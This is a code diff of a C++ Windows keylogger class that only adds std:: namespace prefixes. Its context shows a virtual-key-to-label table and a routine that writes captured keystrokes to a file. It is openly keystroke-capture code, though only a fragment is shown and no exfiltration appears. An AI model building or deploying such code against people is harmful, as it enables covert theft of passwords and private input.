@@ -2,7 +2,7 @@
 
 KeyLogger* KeyLogger::instance = nullptr;
 
-KeyLogger* KeyLogger::getInstance(const string& file_name) {
+KeyLogger* KeyLogger::getInstance(const std::string& file_name) {
 	if (!instance) instance = new KeyLogger(file_name);
 	return instance;
 }
@@ -14,7 +14,7 @@ void KeyLogger::deleteInstance() {
 }
 
 
-unordered_map<int, string> KeyLogger::vkey = {
+std::unordered_map<int, std::string> KeyLogger::vkey = {
 			{VK_TAB, "[ TAB ]"},
 			{VK_RETURN, "[ ENTER ]"},
 			{VK_BACK, "[ BACKSPACE ]"},
@@ -70,21 +70,21 @@ unordered_map<int, string> KeyLogger::vkey = {
 			{VK_INSERT, "[ INSERT ]"}
 };
 
-bool KeyLogger::getSpecialKey(int key, string& key_name) {
+bool KeyLogger::getSpecialKey(int key, std::string& key_name) {
 	if (vkey.find(key) == vkey.end()) return false;
 	key_name = vkey[key];
 	return true;
 }
 
 void KeyLogger::keylog() {
-	ofstream fout (file_name);
+	std::ofstream fout (file_name);
 	if (!fout.good()) {
 		status = 1;
 		return;
 	}
 
 	int key;
-	string key_name;
+	std::string key_name;
 	status = KL_RUNNING;
 	// clear keystroke recorded before
 	for (key = 0x08; key <= 0xE2; key++) {
@@ -109,7 +109,7 @@ void KeyLogger::keylog() {
 	status = KL_FINISHED;
 }
 
-string KeyLogger::getOutputFile() {
+std::string KeyLogger::getOutputFile() {
 	return file_name;
 }
 
